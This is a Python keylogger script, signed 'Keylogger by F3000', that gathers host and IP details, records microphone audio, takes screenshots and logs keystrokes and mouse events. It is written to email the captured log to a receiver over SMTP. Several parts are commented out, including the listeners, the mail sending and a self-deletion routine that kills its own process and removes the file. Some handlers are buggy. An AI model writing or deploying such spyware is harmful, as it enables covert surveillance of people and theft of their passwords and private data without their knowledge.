import logging
import os
import platform
import smtplib
import socket
# import threading
import wave
import pyscreenshot
import sounddevice as sd
# from pynput import keyboard
# from pynput.keyboard import Listener
from dotenv import load_dotenv
# from email import encoders
# from email.mime.base import MIMEBase
# from email.mime.multipart import MIMEMultipart
# from email.mime.text import MIMEText
# import glob

load_dotenv()

EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
SMTP_SERVER = os.getenv("SMTP_SERVER")
SMTP_PORT = os.getenv("SMTP_PORT")
EMAIL_SENDER = os.getenv("EMAIL_SENDER")
EMAIL_RECEIVER = os.getenv("EMAIL_RECEIVER")
SEND_REPORT_EVERY = 10  # seconds


class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started...\n"
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log = self.log + string

    def on_move(self, x, y):
        current_move = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_move)

    def on_click(self, x, y):
        current_click = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_click)

    def on_scroll(self, x, y):
        current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
        self.appendlog(current_scroll)

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = "SPACE"
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = " " + str(key) + " "

        self.appendlog(current_key)

    def send_mail(self, email, password, message):
        m = f"""\
        Subject: main Mailtrap
        To: {EMAIL_SENDER}
        From: {EMAIL_RECEIVER}

        Keylogger by F3000\n"""

        m += message
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server:
            server.login(email, password)
            server.sendmail(EMAIL_SENDER, EMAIL_RECEIVER, message)

    def report(self):
        # self.send_mail(self.email, self.password, "\n\n" + self.log)
        print(self.log)
        self.log = ""
        # timer = threading.Timer(self.interval, self.report)
        # timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        processor = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog("hostname = " + hostname + "\n")
        self.appendlog("ip = " + ip + "\n")
        self.appendlog("processor = " + processor + "\n")
        self.appendlog("system = " + system + "\n")
        self.appendlog("machine = " + machine + "\n")

    def microphone(self):
        fs = 44100
        channels = 1  # mono
        seconds = SEND_REPORT_EVERY
        obj = wave.open("sound.wav", "w")
        obj.setnchannels(channels)  # mono
        obj.setsampwidth(2) # Sampling of 16 bit
        obj.setframerate(fs)
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=channels, dtype='int16')
        sd.wait()
        obj.writeframesraw(myrecording)
        self.appendlog("microphone used.\n")

        # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save("screenshot.png")
        self.appendlog("screenshot used.\n")
        
        # self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

    def run(self):
        # keyboard_listener = keyboard.Listener(on_press=self.save_data)
        # with keyboard_listener:
        #     self.report()
        #     keyboard_listener.join()
        # with Listener(
        #     on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll
        # ) as mouse_listener:
        #     mouse_listener.join()

        # if os.name == "nt":
        #     try:
        #         pwd = os.path.abspath(os.getcwd())
        #         os.system("cd " + pwd)
        #         os.system("TASKKILL /F /IM " + os.path.basename(__file__))
        #         print("File was closed.")
        #         os.system("DEL " + os.path.basename(__file__))
        #     except OSError:
        #         print("File is close.")
        # else:
        #     try:
        #         pwd = os.path.abspath(os.getcwd())
        #         os.system("cd " + pwd)
        #         os.system("pkill leafpad")
        #         os.system("chattr -i " + os.path.basename(__file__))
        #         print("File was closed.")
        #         os.system("rm -rf" + os.path.basename(__file__))
        #     except OSError:
        #         print("File is close.")

        self.system_information()
        # self.screenshot()
        self.microphone()
        self.report()


keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
